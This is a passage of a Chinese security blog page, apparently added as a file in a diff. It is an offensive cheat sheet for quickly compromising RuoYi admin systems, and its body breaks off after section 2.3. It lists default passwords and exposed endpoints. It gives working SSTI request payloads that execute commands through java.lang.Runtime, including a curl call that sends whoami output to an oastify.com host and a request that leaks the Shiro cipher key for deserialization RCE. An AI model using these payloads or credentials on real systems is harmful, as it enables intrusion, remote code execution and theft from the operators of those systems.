@@ -1,0 +1,1755 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Ruoyi快速打点">
+<title>Ruoyi快速打点</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Ruoyi快速打点">
+<meta property='og:description' content="Ruoyi快速打点">
+<meta property='og:url' content='https://lserein.github.io/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-30T15:10:00&#43;08:00'/><meta property='article:modified_time' content='2025-12-30T15:26:57&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/logo.png' />
+<meta name="twitter:title" content="Ruoyi快速打点">
+<meta name="twitter:description" content="Ruoyi快速打点"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/logo.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huc83695a2748b8374c632d172527a7db7_35249_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1版本判断">1.版本判断</a></li>
+    <li><a href="#2常见漏洞">2.常见漏洞</a>
+      <ol>
+        <li><a href="#21全版本都可能存在的漏洞">2.1.全版本都可能存在的漏洞</a></li>
+        <li><a href="#22ruoyi481-后台ssti模板注入漏洞">2.2.Ruoyi4.8.1 后台SSTI模板注入漏洞</a></li>
+        <li><a href="#23ruoyi481-获取shiro-key实现反序列化rce">2.3.Ruoyi4.8.1 获取Shiro key实现反序列化RCE</a></li>
+        <li><a href="#24ruoyi-462版本shiro反序列化漏洞">2.4.RuoYi &lt;<strong>4.6.2版本Shiro反序列化漏洞</strong></a></li>
+        <li><a href="#25ruoyi462版本sql注入漏洞"><strong>2.5.Ruoyi&lt;4.6.2版本SQL注入漏洞</strong></a></li>
+        <li><a href="#26ruoyi460版本ancestors-参数-sql-注入cve-2023-49371">2.6.Ruoyi&lt;=4.6.0版本ancestors 参数 SQL 注入（<strong>CVE-2023-49371）</strong></a></li>
+        <li><a href="#27ruoyi定时任务rce">2.7.Ruoyi定时任务RCE</a>
+          <ol>
+            <li><a href="#271ruoyi-462定时任务rce">2.7.1.Ruoyi &lt;=4.6.2定时任务RCE</a></li>
+            <li><a href="#272ruoyi472-bypass定时任务打内存马">2.7.2.Ruoyi&lt;4.7.2 Bypass定时任务打内存马</a></li>
+            <li><a href="#273ruoyi478-定时任务rce">2.7.3.Ruoyi&lt;=4.7.8 定时任务RCE</a></li>
+          </ol>
+        </li>
+        <li><a href="#28ruoyi478-任意文件下载漏洞cve-2023-27025">2.8.Ruoyi&lt;4.7.8 任意文件下载漏洞（CVE-2023-27025）</a></li>
+        <li><a href="#29ruoyi451任意文件下载漏洞">2.9.Ruoyi&lt;4.5.1任意文件下载漏洞</a></li>
+        <li><a href="#210ruoyi471-ssti模板注入">2.10.Ruoyi&lt;=4.7.1 SSTI模板注入</a></li>
+        <li><a href="#211ruoyi475--createtable-sql注入漏洞">2.11.ruoyi&lt;=4.7.5  createTable sql注入漏洞</a></li>
+        <li><a href="#212ruoyi481-后台存储型xss">2.12.ruoyi&lt;=4.8.1 后台存储型XSS</a></li>
+        <li><a href="#213ruoyi-vue-plus-sendmessagewithattachment任意文件读取漏洞">2.13.RuoYi-Vue-Plus sendMessageWithAttachment任意文件读取漏洞</a></li>
+        <li><a href="#214其它漏洞">2.14.其它漏洞</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/">
+                
+                    <img src="/logo.png" loading="lazy" alt="Featured image of post Ruoyi快速打点" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/">Ruoyi快速打点</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Ruoyi快速打点
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 30, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://mp.weixin.qq.com/s/RVXPNhCqd8WvPG8733oJdA?scene=1&amp;click_id=5"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/RVXPNhCqd8WvPG8733oJdA?scene=1&click_id=5</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/vrPvTQ7Csliw7pOXSkhlZA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/vrPvTQ7Csliw7pOXSkhlZA</a></p>
+<h2 id="1版本判断">1.版本判断
+</h2><p>1.抓包，看js文件后缀进行判断版本http://127.0.0.1/ruoyi/js/ry-ui.js?v=4.8.1</p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/1.png"
+	width="2443"
+	height="980"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/1_hu1ffb1abcd5c3bcaed9969e357a7125ab_292498_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/1_hu1ffb1abcd5c3bcaed9969e357a7125ab_292498_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/2.png"
+	width="2142"
+	height="705"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/2_hufacbab5d309a0956b98a37b17e347462_202358_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/2_hufacbab5d309a0956b98a37b17e347462_202358_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="303"
+		data-flex-basis="729px"
+	
+></p>
+<p>2.进入后台后默认首页也会显示版本信息</p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/3.png"
+	width="1920"
+	height="984"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/3_hua34ce786c4368847090e9ba656f79b17_187902_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/3_hua34ce786c4368847090e9ba656f79b17_187902_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="468px"
+	
+></p>
+<h2 id="2常见漏洞">2.常见漏洞
+</h2><h3 id="21全版本都可能存在的漏洞">2.1.全版本都可能存在的漏洞
+</h3><ol>
+<li>SpringBoot未授权访问</li>
+<li>Swagger未授权访问漏洞</li>
+<li>Druid未授权或弱口令漏洞（ruoyi/123456）</li>
+<li>Ruoyi弱口令（admin/admin123,ry/admin123）</li>
+<li>注册接口开放（/register）</li>
+</ol>
+<h3 id="22ruoyi481-后台ssti模板注入漏洞">2.2.Ruoyi4.8.1 后台SSTI模板注入漏洞
+</h3><p>影响版本：Ruoyi4.8.1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">getNames</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Windows&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">360</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fragment</span><span class="o">=</span><span class="n">__</span><span class="o">|</span><span class="n">$$</span><span class="p">{</span><span class="err">#</span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">print</span><span class="p">(</span><span class="nd">@securityManager.getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">().</span><span class="na">loadClass</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="err">&#39;</span><span class="p">).</span><span class="na">getMethods</span><span class="p">.</span><span class="o">?[</span><span class="n">name</span><span class="o">==</span><span class="err">&#39;</span><span class="n">getRuntime</span><span class="err">&#39;</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">).</span><span class="na">getClass</span><span class="p">.</span><span class="na">getMethods</span><span class="p">.</span><span class="o">?[</span><span class="n">name</span><span class="o">==</span><span class="err">&#39;</span><span class="n">exec</span><span class="err">&#39;</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="nd">@securityManager.getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">().</span><span class="na">loadClass</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="err">&#39;</span><span class="p">).</span><span class="na">getMethods</span><span class="p">.</span><span class="o">?[</span><span class="n">name</span><span class="o">==</span><span class="err">&#39;</span><span class="n">getRuntime</span><span class="err">&#39;</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">),</span><span class="err">&#39;</span><span class="n">calc</span><span class="err">&#39;</span><span class="p">,</span><span class="kc">null</span><span class="p">))}</span><span class="o">|</span><span class="n">__</span><span class="p">::.</span><span class="na">x</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//外带</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fragment</span><span class="o">=</span><span class="n">__</span><span class="o">|</span><span class="n">$$</span><span class="p">{</span><span class="err">#</span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">print</span><span class="p">(</span><span class="nd">@securityManager.getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">().</span><span class="na">loadClass</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="err">&#39;</span><span class="p">).</span><span class="na">getMethods</span><span class="p">.</span><span class="o">?[</span><span class="n">name</span><span class="o">==</span><span class="err">&#39;</span><span class="n">getRuntime</span><span class="err">&#39;</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">).</span><span class="na">getClass</span><span class="p">.</span><span class="na">getMethods</span><span class="p">.</span><span class="o">?[</span><span class="n">name</span><span class="o">==</span><span class="err">&#39;</span><span class="n">exec</span><span class="err">&#39;</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="nd">@securityManager.getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">().</span><span class="na">loadClass</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="err">&#39;</span><span class="p">).</span><span class="na">getMethods</span><span class="p">.</span><span class="o">?[</span><span class="n">name</span><span class="o">==</span><span class="err">&#39;</span><span class="n">getRuntime</span><span class="err">&#39;</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">),</span><span class="err">&#39;</span><span class="n">curl</span><span class="o">+</span><span class="n">http</span><span class="p">:</span><span class="c1">//lj85eiak7migm03gne4zt959s0yrmha6.oastify.com/$(whoami)&#39;,null))}|__::.x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/4.png"
+	width="2540"
+	height="1054"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/4_hue9bf5e1270dd5b4cd76b83d953110740_416291_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/4_hue9bf5e1270dd5b4cd76b83d953110740_416291_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="578px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/5.png"
+	width="2502"
+	height="1051"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/5_hu731d26a11af4c59956442c11b5eaa0a8_423993_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/5_hu731d26a11af4c59956442c11b5eaa0a8_423993_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="571px"
+	
+></p>
+<h3 id="23ruoyi481-获取shiro-key实现反序列化rce">2.3.Ruoyi4.8.1 获取Shiro key实现反序列化RCE
+</h3><p><strong>影响版本：Ruoyi4.8.1</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">getNames</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fragment</span><span class="o">=</span><span class="n">__</span><span class="o">|</span><span class="n">$$</span><span class="p">{</span><span class="err">#</span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">().</span><span class="na">print</span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">&#39;</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">Base64</span><span class="err">&#39;</span><span class="p">).</span><span class="na">getMethod</span><span class="p">(</span><span class="err">&#39;</span><span class="n">getEncoder</span><span class="err">&#39;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">).</span><span class="na">encodeToString</span><span class="p">(</span><span class="nd">@securityManager.rememberMeManager.cipherKey</span><span class="p">))}</span><span class="o">|</span><span class="n">__</span><span class="p">::.</span><span class="na">x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
